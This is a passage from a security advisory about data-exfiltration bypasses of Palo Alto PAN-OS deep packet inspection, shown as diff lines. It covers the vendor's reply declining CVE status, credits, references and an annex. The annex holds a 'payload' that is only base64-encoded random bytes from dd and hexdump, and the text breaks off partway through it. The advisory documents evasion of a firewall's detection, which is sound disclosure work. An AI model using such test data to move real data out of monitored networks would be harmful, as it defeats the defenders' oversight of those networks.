+> Since these reports reflect feature requests rather than product defects, they do not qualify as security vulnerabilities under PAN-OS guidelines. We follow CVE Numbering Authority (CNA) Operational Rules to define vulnerabilities. Specifically, rule 4.1.7 states:
+> 
+> "Detection bypass attacks SHOULD NOT be determined to be vulnerabilities unless a product explicitly claims to detect a specific pattern and fails to do so."
+> 
+> Since PAN-OS does not explicitly claim to detect the reported behaviors, this scenario does not meet the criteria for a CVE-classified vulnerability.
+
+* Mar 31, 2025: A security advisory is published.
+
+
+
+
+## Credits
+
+These vulnerabilities were found by Pierre Barre aka Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html
+
+https://pierrekim.github.io/advisories/2025-palo-alto-dpi.txt
+
+
+
+## Annexes
+
+### Example payload for the Exfiltration of data using TCP and 80/tcp to any IP
+
+This example payload was generated using `dd` and `hexdump -C` (e.g.: `dd if=/dev/urandom bs=1M count=1 | hexdump -C > rand.hex`).
+
+    kali-lan-client# sha256 rand.hex
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  rand.hex
+
+    kali-lan-client# base64 rand.hex
+    MDAwMDAwMDAgIDhlIDAzIDA3IDRiIDhjIGU2IDE3IDAwICA1MiAxZCA4NCA3NSBlNCBmYSA0
+    OSA3NiAgfC4uLksuLi4uUi4udS4uSXZ8CjAwMDAwMDEwICAyZiBlMSBiNiA0NCAxYSA1ZiA4
+    NiA5NSAgYTAgZmUgOTEgZjYgZDAgMGMgMTkgNTIgIHwvLi5ELl8uLi4uLi4uLi5SfAowMDAw
+    MDAyMCAgMTUgMjUgNjUgOWMgMjMgMjAgOTYgMzQgIDM1IDk1IDE2IGY0IGQzIGJmIGM2IDUw
+    ICB8LiVlLiMgLjQ1Li4uLi4uUHwKMDAwMDAwMzAgIDdlIGM2IDJiIGM2IDcwIDE5IDFkIGNh
+    ICA5MCBiOCBkNSBlZiBhOCBlNyBkMiBhZCAgfH4uKy5wLi4uLi4uLi4uLi58CjAwMDAwMDQw
+    ICA4YyA5MyBmNiBlYSA4ZCBiMCA0YyBkZiAgZWQgMjggNzkgZTkgMTcgNWQgZTcgNjcgIHwu
+    Li4uLi5MLi4oeS4uXS5nfAowMDAwMDA1MCAgMDggMTIgOWQgMjMgOTkgMWQgYmUgNTEgIDBi
+    IGRiIDM4IGI3IDBjIGQ4IDgzIGRjICB8Li4uIy4uLlEuLjguLi4uLnwKMDAwMDAwNjAgIDg5
+    IGJjIGUzIGE3IDA0IDE0IGJmIGFkICAzMCBkZiBlZiBhNiA2OSBmYSA5ZiA4YyAgfC4uLi4u
+    Li4uMC4uLmkuLi58CjAwMDAwMDcwICAyOSBlZSAwOCBlNCBjYiAxZCAxNSA5NiAgODQgYjkg
+    NTMgNDEgNjIgNGMgODUgZDMgIHwpLi4uLi4uLi4uU0FiTC4ufAowMDAwMDA4MCAgNjIgMTAg
+    YzMgNjIgOTQgY2EgMTIgMTYgIDc5IDU3IDRhIDc2IGNlIDA4IGZkIDllICB8Yi4uYi4uLi55
+    V0p2Li4uLnwKMDAwMDAwOTAgIDMzIGUwIDk3IGNiIDM0IGU4IDA3IGIzICAyYiA3ZiA1OSA0
+    NCA3YSBjMyAyYiAxOSAgfDMuLi40Li4uKy5ZRHouKy58CjAwMDAwMGEwICBjOSAwMyBhNCA2
+    ZSBlOCBlMiBkYSAyYiAgOWMgMTggNmUgMDggMzggMTAgNzcgOTkgIHwuLi5uLi4uKy4ubi44
+    LncufAowMDAwMDBiMCAgMTMgN2YgNjIgMWMgMDEgM2MgNWIgYWUgIGIyIGQ3IDY4IDFjIGRj
+    IGMyIDc1IDdiICB8Li5iLi48Wy4uLmguLi51e3wKMDAwMDAwYzAgIDJkIDlhIGIwIGU3IGQ0
+    IGJkIDNhIGQ0ICA5MSAxNiBjNiA3OCBkMiA5ZiAxZSBmMSAgfC0uLi4uLjouLi4ueC4uLi58
+    CjAwMDAwMGQwICA1YyAxZiA3MyBlYiBjNyA1NCBkNyA1YSAgNDUgMGUgZmUgYjUgNTMgYTkg
+    ZmUgYzIgIHxcLnMuLlQuWkUuLi5TLi4ufAowMDAwMDBlMCAgOWUgYTIgNDIgYTAgYTMgM2Ig
+    NTYgMDEgIDIzIDQ4IDA5IGU4IDdkIGZhIDI1IDQzICB8Li5CLi47Vi4jSC4ufS4lQ3wKMDAw
+    MDAwZjAgIGI4IGMwIDE4IDcwIGJjIDg2IDUwIDcxICBkMCBiZSAzMiBhNCAwMiAyNiAzYiA1
+    YSAgfC4uLnAuLlBxLi4yLi4mO1p8CjAwMDAwMTAwICBmNyAwNiA3NiBhZSA0YyAyNyA5NSBl
+    MSAgMmUgMzQgNmEgNmEgZDcgZDkgYTAgZTYgIHwuLnYuTCcuLi40amouLi4ufAowMDAwMDEx
+    MCAgNzAgMmIgOTQgNzYgMTIgOTkgMTkgZDAgIDUxIGJkIDA2IGYwIGZmIGI0IDdjIDZiICB8
+    cCsudi4uLi5RLi4uLi58a3wKMDAwMDAxMjAgIDY2IDZjIDU5IGNkIDFlIDk4IGQ1IDVkICBj
+    NyA1NCAzNSBkOSA0YiA2NiA1YSA0MSAgfGZsWS4uLi5dLlQ1LktmWkF8CjAwMDAwMTMwICAz
+    MCBlMSAzMyA0ZSA0ZiA4MSAzOSBkYiAgMjkgZDEgMDUgZDIgMDcgMmIgMWYgZTUgIHwwLjNO
+    Ty45LikuLi4uKy4ufAowMDAwMDE0MCAgNTggNWEgOWQgYjUgODAgOGIgNTIgMWQgIDJhIGZk
+    IGQ0IDhkIDQ1IDFiIGMxIGMzICB8WFouLi4uUi4qLi4uRS4uLnwKMDAwMDAxNTAgIGFkIDFh
+    IDQ0IDAzIDExIGU5IDZlIGRhICBkZSAxNiA3NSA5YyBkMiA5OSBlYyBjZCAgfC4uRC4uLm4u
+    Li51Li4uLi58CjAwMDAwMTYwICBmOCBhNSBmOCAzYiA4NiBkZCA0OSAyMyAgZDEgY2IgOTAg
+    YmMgZjMgMzkgMGEgMjEgIHwuLi47Li5JIy4uLi4uOS4hfAowMDAwMDE3MCAgMTIgYzEgYjYg
+    ZjQgNTQgODAgMGQgMTMgIDQ3IGVmIGNlIDYzIGJhIGFlIGIyIDAzICB8Li4uLlQuLi5HLi5j
+    Li4uLnwKMDAwMDAxODAgIGQ1IGU1IGM2IGQ2IDM2IGYwIGZiIDAwICA5ZSBhYyAzNiA5NyAz
+    ZCA1MyA4MSAzZCAgfC4uLi42Li4uLi42Lj1TLj18CjAwMDAwMTkwICAzZSBlNSBmMiAwYyAy
+    ZiA1MiBkYSA0ZCAgMjcgMWUgNzQgNTggNGIgMDAgNmQgYzAgIHw+Li4uL1IuTScudFhLLm0u
+    fAowMDAwMDFhMCAgNDMgYTUgNzggMWMgOWYgYWMgMTIgMzEgIGUxIGFjIGU5IGNmIGUyIDQ0
+    IGRjIDMzICB8Qy54Li4uLjEuLi4uLkQuM3wKMDAwMDAxYjAgIGE1IGU1IGQ0IGQwIDkyIGUx
+    IGVkIGJiICA3NSAyNSA5NiA0ZSBjMCA1YiBlNSBkMyAgfC4uLi4uLi4udSUuTi5bLi58CjAw
+    MDAwMWMwICA3MyA5MyAwZCBhNyBmZiBmNiBjZSAxYyAgN2EgZGIgZjMgOTAgMGMgMTcgOWQg
+    MTMgIHxzLi4uLi4uLnouLi4uLi4ufAowMDAwMDFkMCAgNmYgOTIgNDYgYzAgODQgNGMgMzgg
+    YTMgIDE5IDdlIGNiIDMxIGIzIDUxIGZiIGU5ICB8by5GLi5MOC4ufi4xLlEuLnwKMDAwMDAx
+    ZTAgIDcyIGE4IGU1IDJiIGEwIDBjIGQxIDQ3ICAzNCA4ZSA2MyAxNiBkNiA0MiBkZSBlZiAg
+    fHIuLisuLi5HNC5jLi5CLi58CjAwMDAwMWYwICA2NCA2YyA4ZCA1NSBkMiBmYyA4NSBmMSAg
+    OWYgNGEgNGUgZDAgN2YgNzAgYjUgZWUgIHxkbC5VLi4uLi5KTi4ucC4ufAowMDAwMDIwMCAg
+    OGQgZjUgYmQgOTMgODUgMGUgOGQgZDEgIDFmIDNhIDA4IGIzIDk3IGMwIDFhIDBhICB8Li4u
+    Li4uLi4uOi4uLi4uLnwKMDAwMDAyMTAgIGQ0IDQ5IGFhIGJiIDBiIDUzIDU2IDIwICA0NyAy
+    YiAzYSA5NiBmYiBiYSBlMCA1OCAgfC5JLi4uU1YgRys6Li4uLlh8CjAwMDAwMjIwICAyMyBm
+    MCBjMiBmOSA0OCA1MSA4YiA3YyAgNTcgMDQgZDIgYzQgNTMgNzIgM2UgMGEgIHwjLi4uSFEu
+    fFcuLi5Tcj4ufAowMDAwMDIzMCAgZjggZGUgNDQgYTUgZjQgYzAgNTEgYzYgIDY3IGRmIGRj
+    IGMxIDljIGJjIDRmIDliICB8Li5ELi4uUS5nLi4uLi5PLnwKMDAwMDAyNDAgIGQxIGU3IGNj
+    IGQ2IDQxIGY4IGM3IDM2ICA3NSA4OCA5NSBkZiA2YyAxZSA3ZSBlNSAgfC4uLi5BLi42dS4u
+    Lmwufi58CjAwMDAwMjUwICAxMSBiZSAyNyAzOCBiNSBkNCBjMCA4YSAgOGIgMzkgYjEgMTEg
+    NzggNDcgZTMgZGIgIHwuLic4Li4uLi45Li54Ry4ufAowMDAwMDI2MCAgOTkgMGMgZjQgMGYg
+    ZWUgNjIgODIgMzMgIDkyIGIyIDA0IGJiIGM3IDRmIGNmIGY0ICB8Li4uLi5iLjMuLi4uLk8u
+    LnwKMDAwMDAyNzAgIDZiIGQ3IGJhIDc3IDE2IDNiIDY0IDEyICAyYiA4NCA5ZCBjNCBmOCA0
+    OCBmNSBlYSAgfGsuLncuO2QuKy4uLi5ILi58CjAwMDAwMjgwICAxNCA2MSBlOCA2OCA4MSA3
+    MiBjNiBkZCAgMDcgOTQgNTEgMDcgN2QgYzIgZjMgNGIgIHwuYS5oLnIuLi4uUS59Li5LfAow
+    MDAwMDI5MCAgZTMgODIgMjggMmEgZGEgMmEgMTIgZmUgIGQ3IGY2IGJlIDAzIDNlIDY2IGE2
+    IDEwICB8Li4oKi4qLi4uLi4uPmYuLnwKMDAwMDAyYTAgIDQ4IDE4IDIwIDI0IDE2IDUyIDRk
+    IGVkICBiNSA4MiA0YSBjZSA3YSAwNiAxYiA2YyAgfEguICQuUk0uLi5KLnouLmx8CjAwMDAw
+    MmIwICBiYSA2YSA1YSA0YSA4ZiAxYyA1NiBkNiAgYzUgZGQgMmQgMTEgYTMgNzggOTEgNGIg
+    IHwualpKLi5WLi4uLS4ueC5LfAowMDAwMDJjMCAgNzcgYTYgYTggYzQgYzYgYmUgNGEgNDcg
+    IDk0IGE5IGIwIGMwIGUwIDZiIDI3IGQxICB8dy4uLi4uSkcuLi4uLmsnLnwKMDAwMDAyZDAg
+    IDE3IGQ1IDdkIDgzIGJlIDI3IDRjIDU2ICBiMiBlYiBhZSA2NSBiNSBmYSAwMSBkOCAgfC4u
+    fS4uJ0xWLi4uZS4uLi58CjAwMDAwMmUwICAyNiBlOCA3MyAzYiBlMSBiNSBhYyA5MyAgMjAg
+    OTUgODkgMTIgZDMgYzYgZWYgN2MgIHwmLnM7Li4uLiAuLi4uLi58fAowMDAwMDJmMCAgNmEg
+    N2IgMDUgNjggZDggNGIgYTYgMDEgIGFkIDZjIDlhIGFhIDI0IDZlIGFhIDljICB8ansuaC5L
+    Li4ubC4uJG4uLnwKMDAwMDAzMDAgIGRmIDZmIDZhIDNkIGEzIGJlIGI3IDVhICA5OCAxMyAy
+    NyA3MCBhMyAzZiA5YyBiNSAgfC5vaj0uLi5aLi4ncC4/Li58CjAwMDAwMzEwICBmYyBkNSA0
+    OCAyNSA3MiBlMCA5NSBhMyAgMWEgZWQgYTAgZmYgNzEgNjcgMGEgZWUgIHwuLkglci4uLi4u
+    Li5xZy4ufAowMDAwMDMyMCAgZGQgNDkgNzYgYmUgYWIgYjMgZDIgOWYgIDRmIDhhIDc1IDZm
+    IDZiIDg3IDJkIDE3ICB8Lkl2Li4uLi5PLnVvay4tLnwKMDAwMDAzMzAgIGQzIDJiIDRiIGNj
+    IDFmIDc2IGE2IDAxICBkYSBhNCA4NiA3NSA5YyA2NCAyNiBlZCAgfC4rSy4udi4uLi4udS5k
+    Ji58CjAwMDAwMzQwICAzMSBmNyBiZiBlMSA3MiAxNyBmYSA1MiAgZmEgY2UgNGIgYWQgNTIg
+    NWIgMWQgM2MgIHwxLi4uci4uUi4uSy5SWy48fAowMDAwMDM1MCAgOWMgOWIgZTQgMmUgYTkg
+    ZmEgMWUgZWUgIDE5IDFiIGE2IGMxIDgzIGUxIDRiIDgzICB8Li4uLi4uLi4uLi4uLi5LLnwK
+    MDAwMDAzNjAgIDJlIGQ3IGU4IDMyIDFlIDdiIGExIDhkICA5NSBkNyBiOCA2ZCBhMCAwZCA5
+    MyAxYiAgfC4uLjIuey4uLi4ubS4uLi58CjAwMDAwMzcwICA2ZiA1MSA4ZSBkNCAzOSA4YSBj
+    YiBjMyAgYmIgMjEgMWQgZGIgMDUgZDYgYzUgY2YgIHxvUS4uOS4uLi4hLi4uLi4ufAowMDAw
+    MDM4MCAgMTkgNWQgMGYgZTcgNDQgMWQgZjQgYmYgIDI2IDBkIDI2IGFlIDQ1IDkzIDI0IDU5
+    ICB8Ll0uLkQuLi4mLiYuRS4kWXwKMDAwMDAzOTAgIGFkIGVmIDY4IDdhIGExIGU3IGMyIDQw
+    ICAxNiBhMCBjZiA2MCAzNCBmNiA4YiBlNiAgfC4uaHouLi5ALi4uYDQuLi58CjAwMDAwM2Ew
+    ICA5MSA3MCBhOCA4YSBkZiA1ZiA2NCAzYyAgY2QgYWEgNDIgYjcgZWQgN2UgYTggZDQgIHwu
+    cC4uLl9kPC4uQi4ufi4ufAowMDAwMDNiMCAgMGEgNWEgNGUgMzYgYjAgNmYgNzAgOGQgIDI3
+    IDBmIDhlIDgzIDQ4IDkzIDExIDhmICB8LlpONi5vcC4nLi4uSC4uLnwKMDAwMDAzYzAgIDE5
+    IGJhIDY1IDkxIDY5IGRjIDc2IGE3ICAxZCAxOSA1MyAwMyBlNiA4OSBkMSA2MiAgfC4uZS5p
+    LnYuLi5TLi4uLmJ8CjAwMDAwM2QwICAwNCA3YiA1ZiBmZiBlOCA2NyAwNiBlOSAgZjEgNWEg
+    ZjMgZjYgOGYgYWIgMzkgMzMgIHwue18uLmcuLi5aLi4uLjkzfAowMDAwMDNlMCAgZTYgM2Qg
+    ZGEgYWQgZmIgOGUgYWQgM2UgIGQ3IDgwIGEyIDRiIGQ2IDczIGJjIGMzICB8Lj0uLi4uLj4u
+    Li5LLnMuLnwKMDAwMDAzZjAgIGQ5IGZmIGU0IGI1IGY0IGQxIDMxIDZiICBmOSA0NCA2MCBj
+    MiBkYyA2MCBjYSAxMCAgfC4uLi4uLjFrLkRgLi5gLi58CjAwMDAwNDAwICA4OSBhOCA5ZSAw
+    NyA0NyA5NCA0NCBlZiAgNzIgZmIgOGUgZmUgZmQgZTggMjUgZjkgIHwuLi4uRy5ELnIuLi4u
+    LiUufAowMDAwMDQxMCAgOWIgMzMgZDIgZjQgMGEgOWQgNzQgZWQgIGY5IGQzIGY2IDAzIDll
+    IDIwIDMzIGY5ICB8LjMuLi4udC4uLi4uLiAzLnwKMDAwMDA0MjAgIDE3IDM4IDIzIDk1IDEx
+    IDdiIDFmIGNmICA1NSA5NyA3YyAxYyAwNyBlOCA1ZiAxMSAgfC44Iy4uey4uVS58Li4uXy58
+    CjAwMDAwNDMwICA4MSAwYiBmZCA0OCBkNiBmMSBkMSAyYiAgMDggZWMgODEgODAgNDYgNDEg
+    NzEgNTUgIHwuLi5ILi4uKy4uLi5GQXFVfAowMDAwMDQ0MCAgY2QgNjMgMWYgZTkgZDAgNDUg
+    NjEgMGIgIDY4IDA0IDNhIGI3IDYzIGFmIGNlIDEyICB8LmMuLi5FYS5oLjouYy4uLnwKMDAw
+    MDA0NTAgIGI3IGM5IGVjIDVkIDc1IDZlIGExIDA1ICAwYyAwMyA4OCBhZiA3MyA5MSBiMiA5
+    MiAgfC4uLl11bi4uLi4uLnMuLi58CjAwMDAwNDYwICA1MCAzZiA0NSA1MyA4NCAxZSA5OSAw
+    OSAgMGEgNTcgMjMgNTcgMDkgMWUgOTkgNmEgIHxQP0VTLi4uLi5XI1cuLi5qfAowMDAwMDQ3
+    MCAgYjIgNGQgMTQgYmMgYmMgMmMgNDMgYjkgIGZiIGMxIGJjIDM2IDIwIDg3IDY2IGVjICB8
+    Lk0uLi4sQy4uLi42IC5mLnwKMDAwMDA0ODAgIGMzIGFmIGU5IDMwIGEwIGI2IDkzIDM0ICAy
+    ZiA4MyBlNiBkNCA3YSBiZCAyMyBlZiAgfC4uLjAuLi40Ly4uLnouIy58CjAwMDAwNDkwICBl
+    YiBkYiA5OCA0YSA4MyAwNSBmYiBmZSAgZjMgZWIgZjAgZDEgNTAgMDIgMTYgNWIgIHwuLi5K
+    Li4uLi4uLi5QLi5bfAowMDAwMDRhMCAgYTIgNjYgYWMgZDYgMTUgZWQgNWEgZjggIDkwIDFl
+    IDNmIGI5IDcwIDM3IDRhIDc1ICB8LmYuLi4uWi4uLj8ucDdKdXwKMDAwMDA0YjAgIDY0IDk0
+    IGRjIGRmIDJhIDYzIDlkIDU1ICA4MCBmYyA5NyA0OSA4OSAwYyA2YiA3NiAgfGQuLi4qYy5V
+    Li4uSS4ua3Z8CjAwMDAwNGMwICBlNCAxOSAyNyAxZCA2MSA1ZiAwZCA2YyAgYTMgNWYgMDAg
+    OGUgNmQgMjkgZTMgN2YgIHwuLicuYV8ubC5fLi5tKS4ufAowMDAwMDRkMCAgNGUgNGIgMjUg
+    ZDAgYzYgZmMgZDEgY2UgIDcwIDE3IDdiIDNmIDUxIDBmIDU0IGNiICB8TkslLi4uLi5wLns/
+    US5ULnwKMDAwMDA0ZTAgIGFmIDYyIDIxIDQ3IGEzIDc1IDRlIDk4ICBkMCBlYyA0YyA3ZSA4
+    ZiAxNiA5MSA4YiAgfC5iIUcudU4uLi5Mfi4uLi58CjAwMDAwNGYwICAxNiBhOCBhMyBiMiA3
+    NSAyNCA5NCAxNCAgYmIgYjEgNjEgNjYgMTcgMTEgNjUgMmQgIHwuLi4udSQuLi4uYWYuLmUt
+    fAowMDAwMDUwMCAgNTIgM2EgNWQgN2YgYzAgMzAgNWUgNWMgIDU4IDRmIDdkIDIxIDkxIGJh
+    IDEyIDFiICB8UjpdLi4wXlxYT30hLi4uLnwKMDAwMDA1MTAgIDE0IDQxIGQ0IDgxIGUwIGI1
+    IDhlIGNhICAyYyBmYiA4MyA4OCBmYyA5YyA1OSA1YSAgfC5BLi4uLi4uLC4uLi4uWVp8CjAw
+    MDAwNTIwICBhNiA4MyBkNyA3MiAxZiBlNCBkYiA5MyAgYTMgN2EgNGYgZTAgYmUgZDEgMmIg
+    MTggIHwuLi5yLi4uLi56Ty4uLisufAowMDAwMDUzMCAgZmMgMDQgMjIgOTIgNDIgMGQgYmMg
+    MTEgIDE2IGZkIDU5IDA1IDEzIGE1IDZkIGNmICB8Li4iLkIuLi4uLlkuLi5tLnwKMDAwMDA1
+    NDAgIDJhIGZmIDFiIDkzIDgyIGQ3IGNhIDMwICAwYyBjNCA5ZCAyMiBiOSBmYyAxYyA2NCAg
+    fCouLi4uLi4wLi4uIi4uLmR8CjAwMDAwNTUwICA5YSAwYiBjNSBmNyAwNCAxOSAwYiA3MyAg
+    ZjMgN2UgYTUgYzggZWQgMWUgYTMgZGIgIHwuLi4uLi4ucy5+Li4uLi4ufAowMDAwMDU2MCAg
+    ZWUgNDQgMzggMGEgNGUgZmUgYWMgMzggIDBmIDMzIGQyIDVlIDU1IDY3IDc0IDk3ICB8LkQ4
+    Lk4uLjguMy5eVWd0LnwKMDAwMDA1NzAgIDAyIDdhIDQ0IGUxIDc2IDQ4IGUwIDI3ICA0MyA3
+    ZSA2NiAwOSAyOSA3OSBhNiBjOCAgfC56RC52SC4nQ35mLil5Li58CjAwMDAwNTgwICBjMSAx
+    YiAwZSBiMiAzOSA1OSA1OCBiZSAgZmMgYjggOGEgOWQgZWQgNmQgZGQgNTMgIHwuLi4uOVlY
+    Li4uLi4ubS5TfAowMDAwMDU5MCAgNTUgMTQgYmUgOTEgZjIgYmYgNGIgNjYgIGYwIDc4IDVj
+    IDQ0IDMzIGZlIDRlIDc5ICB8VS4uLi4uS2YueFxEMy5OeXwKMDAwMDA1YTAgIDQyIDFhIDJk
+    IDRjIDJlIDMyIDliIDExICBiYSA0MCA2ZSBmMSA0NSBlNiA5MyBiZSAgfEIuLUwuMi4uLkBu
+    LkUuLi58CjAwMDAwNWIwICBjMyAxNSBkYyA2MyBkMyBlNCBlYyA5MSAgZjAgMzYgNWIgMTQg
+    NTYgNDIgMGQgMTcgIHwuLi5jLi4uLi42Wy5WQi4ufAowMDAwMDVjMCAgYjggMGUgODcgOGMg
+    MWEgYTcgMzEgZjMgIGIwIDg2IDllIGJlIDUyIGQwIDIwIDQ1ICB8Li4uLi4uMS4uLi4uUi4g
+    RXwKMDAwMDA1ZDAgIDJjIDM4IGYwIDEwIDIwIGNlIDUyIDQzICBlZSAyZSAwNyAzYSAyNiBk
+    YSA4ZSA1MSAgfCw4Li4gLlJDLi4uOiYuLlF8CjAwMDAwNWUwICA5MiBkYSAwNiA0MyBhMSBi
+    OSAzYSBjYiAgNzYgYTAgMDkgNGQgMmEgMTMgMzMgMmIgIHwuLi5DLi46LnYuLk0qLjMrfAow
+    MDAwMDVmMCAgYjMgZDcgOTQgZGUgYTEgZDcgNTggZTYgIDY4IDAzIDY4IDMyIDk1IGVkIDg3
+    IGM3ICB8Li4uLi4uWC5oLmgyLi4uLnwKMDAwMDA2MDAgIDdlIGM0IGUwIGU0IGRmIGY4IGY2
+    IGY1ICAzYSA4YiBmZiBmOCBlOSA1ZSBkMCBhOCAgfH4uLi4uLi4uOi4uLi5eLi58CjAwMDAw
+    NjEwICAzZiBjMiAwZCAyMiBiNSA4ZCAwZCBlYiAgMDggYTIgOGMgYzkgMDcgMjQgYzMgYWMg
+    IHw/Li4iLi4uLi4uLi4uJC4ufAowMDAwMDYyMCAgYmYgYzAgYjYgZTAgZDAgZTEgZDUgOWEg
+    IGVjIDI5IDg4IDBhIGQ4IDk4IDNlIDJiICB8Li4uLi4uLi4uKS4uLi4+K3wKMDAwMDA2MzAg
+    IDFlIDRkIGUzIDk5IDJjIGVkIDYzIDJjICBkMSA1ZCA1OCA5NiBkNiAzMyA0MSAxNiAgfC5N
+    Li4sLmMsLl1YLi4zQS58CjAwMDAwNjQwICAxMiA4MyA1ZiBkMiA3NiAzZiAyYyBiZSAgODMg
+    MDAgMjQgYzkgZWUgYzggZjUgZTYgIHwuLl8udj8sLi4uJC4uLi4ufAowMDAwMDY1MCAgNWYg
+    NjEgNTkgNzcgNzQgMjYgNjQgZmMgIGU2IDdkIDc3IDgzIDhkIDc2IDY5IDc1ICB8X2FZd3Qm
+    ZC4ufXcuLnZpdXwKMDAwMDA2NjAgIGM4IDFiIGVlIGNjIDA0IGFjIDU4IGIzICBhZCAyMCA1
+    OSAzMCAyZCAwMiAwYiAwNSAgfC4uLi4uLlguLiBZMC0uLi58CjAwMDAwNjcwICA3ZCAwNyAz
+    OSA4YyAxNiA0NSA3OCA1OSAgM2QgODkgZDUgYmQgODIgMWMgODggZjMgIHx9LjkuLkV4WT0u
+    Li4uLi4ufAowMDAwMDY4MCAgNzAgZjYgMjEgNmQgYjAgNTEgY2IgMTAgIDVlIDNlIDUzIGQ0
+    IGExIDMzIDg0IGI0ICB8cC4hbS5RLi5ePlMuLjMuLnwKMDAwMDA2OTAgIDZlIDNkIDlhIDlj
+    IGY1IGEwIDI5IDBkICAyMCBkMiA5YyA4OSA3OCA0ZiA2NSBkOSAgfG49Li4uLikuIC4uLnhP
+    ZS58CjAwMDAwNmEwICA1MyBlYiA4OCAzZSBkOSA4ZCBkNyBjMSAgNTMgNjYgOTYgOTggZWUg
+    N2UgNmQgNmYgIHxTLi4+Li4uLlNmLi4ufm1vfAowMDAwMDZiMCAgODEgZTUgMjcgMjEgMzMg
+    MmEgN2YgYjYgIGRhIDE3IGE3IGQ4IDBjIGYxIDVkIGU3ICB8Li4nITMqLi4uLi4uLi5dLnwK
+    MDAwMDA2YzAgIDI5IGY0IGUxIGNmIDI1IDkyIGQzIDJmICA2NiAxMSBkMiA5NSBlYSBlMiA1
+    NiBmMSAgfCkuLi4lLi4vZi4uLi4uVi58CjAwMDAwNmQwICA1YiBkYiA4OSA3NyBkYiA3YiAw
+    ZSBiZCAgY2QgYzEgZTQgYzggNTcgZTQgZGMgOTQgIHxbLi53LnsuLi4uLi5XLi4ufAowMDAw
+    MDZlMCAgNGUgMjIgODMgY2IgZmEgYmUgM2EgZmMgIGM5IDE2IDA5IDZjIDFlIGI0IDgzIGRi
+    ICB8TiIuLi4uOi4uLi5sLi4uLnwKMDAwMDA2ZjAgIGQ5IDUyIDJmIDdkIDEzIDg4IGE2IGY5
+    ICBlYSBmZSAxYyAyOCA4MSAyMyAxMiA5MSAgfC5SL30uLi4uLi4uKC4jLi58CjAwMDAwNzAw
+    ICBhYSBmYiA5MCA1OCBhYyBkOCA0YyBmZCAgZmEgZDQgNWQgNDcgOTYgZmIgZjIgMDQgIHwu
+    Li5YLi5MLi4uXUcuLi4ufAowMDAwMDcxMCAgY2MgNmYgM2QgNGYgNzQgNDQgYzIgMDEgIDdj
+    IDJiIGM5IDg1IDA1IGU5IDlkIDVhICB8Lm89T3RELi58Ky4uLi4uWnwKMDAwMDA3MjAgIGE2
+    IGM4IDY5IDU3IGY3IDAwIDBhIGVhICBlZSBmZCA3ZiA2OSA3ZiA4NSBlMSAwZCAgfC4uaVcu
+    Li4uLi4uaS4uLi58CjAwMDAwNzMwICA2MiAzOSBkMCBiYSBjYyAyYSA4NCAyOCAgZWMgYWYg
+    NmUgY2UgZDkgNjEgYTYgNTMgIHxiOS4uLiouKC4ubi4uYS5TfAowMDAwMDc0MCAgY2QgMGUg
+    Y2UgZTQgZGMgNDIgZDMgZTMgIDJhIGFmIDE3IGIwIDc4IDYzIDYwIDdjICB8Li4uLi5CLi4q
+    Li4ueGNgfHwKMDAwMDA3NTAgIDRiIDg5IGQyIDI5IGU1IDA0IGJiIGExICA0ZSBhNSA2NSBh
+    ZSA5NSA2ZiBmMSAyNSAgfEsuLikuLi4uTi5lLi5vLiV8CjAwMDAwNzYwICBhYiBmOSA3MSA5
+    ZSAwMiA4NSBjMCBjOSAgN2QgMGYgOGYgM2QgOTIgNjMgY2MgYjMgIHwuLnEuLi4uLn0uLj0u
+    Yy4ufAowMDAwMDc3MCAgYTggMjggMmMgOTAgNTMgZmQgMzggNjcgIDI3IGUwIDNmIGJlIDM3
+    IDQyIDAxIDcyICB8LigsLlMuOGcnLj8uN0IucnwKMDAwMDA3ODAgIGZiIDMyIGQxIDUwIGVm
+    IGNjIGJlIGQ4ICAyMSA3OSA4NiBjOCA4MiAwNyA5ZiAwMCAgfC4yLlAuLi4uIXkuLi4uLi58
+    CjAwMDAwNzkwICBmOSBkZiA0OCBlYiAyNyA5MSBkNCBlMSAgNWEgMmMgNmIgZTIgYzcgOTgg
+    ZTIgY2EgIHwuLkguJy4uLlosay4uLi4ufAowMDAwMDdhMCAgZGQgM2YgMTEgOWMgYmEgNTMg
+    NGEgOWMgIGVkIDZhIDMxIDE3IDM5IGE1IGM2IGU2ICB8Lj8uLi5TSi4uajEuOS4uLnwKMDAw
+    MDA3YjAgIDdiIDExIDNlIDk5IGRjIDkxIGZmIDNkICBlZiAyNiBjNSAzYiBiZiA0ZiA3NyA0
+    NCAgfHsuPi4uLi49LiYuOy5Pd0R8CjAwMDAwN2MwICBlZiAyYyAwYyA3MiBiNyBhMSA2MiBl
+    NyAgMmEgNDAgNGYgNTUgYTcgYzQgMmIgYWUgIHwuLC5yLi5iLipAT1UuLisufAowMDAwMDdk
+    MCAgZDggYTMgMmQgZWIgZDIgMWYgNjAgNTkgIDBlIDVhIDEzIDAyIDE3IGI4IDM1IGZiICB8
+    Li4tLi4uYFkuWi4uLi41LnwKMDAwMDA3ZTAgIDQwIGUwIDAyIGU0IGIzIGYxIGRiIGE2ICAz
+    YiA3MSBiZCBjMiBjNyA3ZCA2MCBjZiAgfEAuLi4uLi4uO3EuLi59YC58CjAwMDAwN2YwICA0
+    ZiAzOSBmOCBhMSBkNyBmNyAxOCAyNCAgNWEgZGEgNTQgODMgNTkgYTUgYWYgYjAgIHxPOS4u
+    Li4uJFouVC5ZLi4ufAowMDAwMDgwMCAgNmUgNjAgMjggM2YgNWYgMjIgNDMgN2UgIGUzIGM1
+    IDVmIGI1IGM2IGNmIDA5IGExICB8bmAoP18iQ34uLl8uLi4uLnwKMDAwMDA4MTAgIDJhIGMz
+    IDk1IGI1IDFkIDAxIDVjIDk5ICAwMCA5MyBlZSA4MCBlMSA0NCA2OSAxZiAgfCouLi4uLlwu
+    Li4uLi5EaS58CjAwMDAwODIwICBkZCAwZSBjZCBiZSA3NiBkOSA1YyA4YyAgYTcgM2MgMzYg
+    OTAgYzMgNzQgZjEgMmIgIHwuLi4udi5cLi48Ni4udC4rfAowMDAwMDgzMCAgZTcgOTYgN2Ug
+    YjUgYTMgYjAgNWQgZWUgIDVjIDAwIDIwIDE3IDdhIDRjIDljIDgyICB8Li5+Li4uXS5cLiAu
+    ekwuLnwKMDAwMDA4NDAgIGM5IGZiIGE0IGRmIGU1IDE3IDU1IDEwICA3YSA0OSBiOSAwNSAy
+    NyBhZCA2MSA5YyAgfC4uLi4uLlUuekkuLicuYS58CjAwMDAwODUwICAwOCAxMyBlZCAxYiA3
